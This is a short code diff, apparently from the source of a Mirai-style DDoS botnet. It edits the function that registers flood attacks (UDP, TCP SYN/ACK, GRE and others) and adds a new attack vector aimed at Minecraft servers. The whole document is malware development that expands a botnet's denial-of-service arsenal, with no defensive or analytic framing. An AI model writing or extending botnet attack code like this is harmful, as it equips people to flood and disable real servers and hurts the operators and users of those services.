@@ -23,7 +23,7 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
     add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);
     add_attack(ATK_VEC_UDP_RAND, (ATTACK_FUNC)attack_udp_rand);
-    add_attack(ATK_VEC_RAKNET, (ATTACK_FUNC)attack_udp_raknet);    
+    add_attack(ATK_VEC_RAKNET, (ATTACK_FUNC)attack_udp_raknet);
 
     add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
     add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
@@ -31,6 +31,7 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_TCP_BYPASS, (ATTACK_FUNC)attack_tcp_bypass);
     add_attack(ATK_VEC_LEGIT, (ATTACK_FUNC)attack_tcp_legit);
     add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_tcp_socket);
+    add_attack(ATK_VEC_MC, (ATTACK_FUNC)attack_tcp_minecraft); 
 
     add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
     add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);
